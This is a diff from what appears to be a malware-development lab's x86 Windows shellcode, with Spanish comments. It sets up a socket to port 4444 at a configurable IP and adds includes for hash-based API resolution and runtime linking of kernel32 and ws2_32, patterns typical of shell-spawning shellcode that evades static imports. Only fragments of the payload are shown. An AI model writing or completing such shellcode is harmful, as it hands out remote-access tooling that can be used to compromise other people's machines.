@@ -143,7 +143,7 @@ mov     word [esi], 0x2                 ; sin_family = AF_INET
 mov     word [esi + 0x2], 0x5C11        ; sin_port = 4444 (network byte order [big endian])
 
 ; mov     dword [esi + 0x4], 0x0100007F   ; sin_addr = 127.0.0.1 (network byte order [big endian])
-mov     ecx, [edx + IP_VBOX]
+mov     ecx, [edx + IP_LOCAL]
 mov     dword [esi + 0x4], ecx
 
 mov     dword [esi + 0x8], eax          ; sin_zero (primeros 4 bytes)
@@ -237,9 +237,12 @@ mov esp, ebp    ; limpia la pila
 pop ebp         ; restaura el viejo frame pointer
 ret             ; vuelve a la dirección de retorno
 
-; -----------------------------------
-%include "C:\Users\test\Desktop\mal-dev-lab\101-code\ASM-shellcodes\runtime_linking\x86\exports.asm"
-; -----------------------------------
+; ---------------------------------------
+%include "../../hashing/x86/rol_xor.asm"
+%include "../../runtime_linking/x86/get_proc_address.asm"
+%include "../../runtime_linking/x86/get_module_handle.asm" 
+%include "../../runtime_linking/x86/runtime_linking.asm" 
+; ---------------------------------------
 
 KERNEL32:       dd 0x4b1ffe8e
 WS2_32_STR:     db 'ws2_32.dll', 0
